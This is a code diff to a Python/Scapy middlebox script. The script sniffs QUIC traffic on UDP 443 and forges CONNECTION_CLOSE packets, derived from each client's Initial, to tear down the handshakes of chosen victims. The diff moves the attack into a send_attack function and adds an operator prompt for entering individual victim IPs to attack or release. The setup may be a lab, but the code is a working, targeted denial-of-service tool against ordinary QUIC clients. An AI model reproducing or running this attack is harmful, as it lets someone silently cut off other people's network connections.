@@ -17,7 +17,7 @@ import threading, sys, os
 attack_mode   = False          # False → transparent, True → block handshakes
 blocked_ips  = set()          # victim IPs we have already killed this run
 def operator_cli():
-    global attack_mode, blocked_cids
+    global attack_mode, blocked_ips
     while True:
         try:
             cmd = input("middlebox (a=attack, p=passive, q=quit)> ").strip().lower()
@@ -25,17 +25,38 @@ def operator_cli():
             break
         if cmd in ("a", "attack"):
             attack_mode  = True
-            blocked_cids = set()        # start a fresh list
+            blocked_ips = set()        # start a fresh list
             print(">> ATTACK MODE  - every new Initial will be closed")
         elif cmd in ("p", "passive"):
             attack_mode  = False
-            blocked_cids = set()        # forget old CIDs
+            blocked_ips = set()        # forget old CIDs
             print(">> Passive mode - transparent forwarding")
         elif cmd in ("q", "quit"):
             os._exit(0)
 
 
+def operator_cli2():
+    global blocked_ips
+    blocked_ips = set()        # start a fresh list
+    while True:
+        try:
+            cmd = input("middlebox (a=move to attack, p=move to passive, q=quit)> ").strip().lower()
+        except EOFError:
+            break
+        if cmd in ("a", "attack"):
+            ip_to_block = input("Enter IP: ").strip()
+            print(f">> IP: {ip_to_block} enters ATTACK MODE  - every Initial will be closed")
+            if not ip_to_block in blocked_ips:
+                blocked_ips.add(ip_to_block)
 
+        elif cmd in ("p", "passive"):
+            ip_to_unblock = input("Enter IP: ").strip()
+            print(f">> IP: {ip_to_unblock} enters Passive mode - transparent forwarding")
+            if ip_to_unblock in blocked_ips:
+                blocked_ips.remove(ip_to_unblock)
+
+        elif cmd in ("q", "quit"):
+            os._exit(0)
 
 
 def add_and_send_to_server(pkt):
@@ -47,6 +68,42 @@ def add_and_send_to_server(pkt):
     del new_pkt.getlayer(UDP).chksum
     print(f"New PKT to server: {new_pkt.summary()}")
     send(new_pkt, iface='middlebox-eth1')
+
+
+
+
+"""initial =  QUIC_Initial(
+    Version      = 0x00000001,
+    DstConnIDLen = len(qi.SrcConnID), DstConnID=qi.SrcConnID,
+    SrcConnIDLen = len(qi.DstConnID), SrcConnID=qi.DstConnID,
+    TokenLen     = 0,
+    Token        = b'',
+    PacketNumber = 1,
+    # length = size of everything after the PacketNumber field
+    # here: one CC frame only
+    Length       = len(QUIC_CONNECTION_CLOSE())
+)"""
+
+
+def send_attack(victim):
+    # build a CONNECTION_CLOSE frame
+    cc = QUIC_CONNECTION_CLOSE(
+        type          = 0x1C,
+        error_code    = 0x10,         # arbitrary error
+        frame_type    = 0,            # e.g. PADDING triggered it
+        reason_phrase = b"oops!"
+    )
+    frame  = bytes(cc)
+    tpl    = (victim[IP].src, victim[UDP].sport, victim[IP].dst, victim[UDP].dport)
+    dcid_for_keys   = victim[QUIC_Initial].DstConnID      # client-chosen DCID → secrets
+    dcid_in_header  = victim[QUIC_Initial].SrcConnID      # client’s SrcCID     → header
+    forged = forge_cc_scapy(
+        dcid_secret = dcid_for_keys,
+        dcid_header = dcid_in_header,
+        tpl = tpl,
+        frame = frame)
+    send(forged, iface='middlebox-eth0')
+
 
 def handle_quic(pkt):
     global ports, attack_mode, blocked_ips
@@ -66,38 +123,8 @@ def handle_quic(pkt):
                 - TokenLength   : {qi.TokenLen}")
                 - PacketNumber  : {qi.PacketNumber}")
                 - PayloadLength : {qi.Length}""")
-                if attack_mode:
-                    if pkt[IP].src not in blocked_cids:
-                        """initial =  QUIC_Initial(
-                            Version      = 0x00000001,
-                            DstConnIDLen = len(qi.SrcConnID), DstConnID=qi.SrcConnID,
-                            SrcConnIDLen = len(qi.DstConnID), SrcConnID=qi.DstConnID,
-                            TokenLen     = 0,
-                            Token        = b'',
-                            PacketNumber = 1,
-                            # length = size of everything after the PacketNumber field
-                            # here: one CC frame only
-                            Length       = len(QUIC_CONNECTION_CLOSE())
-                        )"""
-
-                        # build a CONNECTION_CLOSE frame
-                        cc = QUIC_CONNECTION_CLOSE(
-                            type          = 0x1C,
-                            error_code    = 0x10,         # arbitrary error
-                            frame_type    = 0,            # e.g. PADDING triggered it
-                            reason_phrase = b"oops!"
-                        )
-                        frame  = bytes(cc)
-                        tpl    = (pkt[IP].src, pkt[UDP].sport, pkt[IP].dst, pkt[UDP].dport)
-                        dcid_for_keys   = qi.DstConnID      # client-chosen DCID → secrets
-                        dcid_in_header  = qi.SrcConnID      # client’s SrcCID     → header
-                        forged = forge_cc_scapy(
-                            dcid_secret = dcid_for_keys,
-                            dcid_header = dcid_in_header,
-                            tpl = tpl,
-                            frame = frame)
-                        send(forged, iface='middlebox-eth0')
-                        blocked_cids.add(pkt[IP].src)
+                if pkt[IP].src in blocked_ips: 
+                    send_attack(pkt)
                     return
                 
             add_and_send_to_server(pkt)
@@ -117,7 +144,7 @@ def handle_quic(pkt):
 
 
 if __name__ == "__main__":       
-    threading.Thread(target=operator_cli, daemon=True).start()
+    threading.Thread(target=operator_cli2, daemon=True).start()
     # Sniff UDP 443 traffic and invoke handle_quic for each packet
     sniff(
         #iface="Ethernet 2",
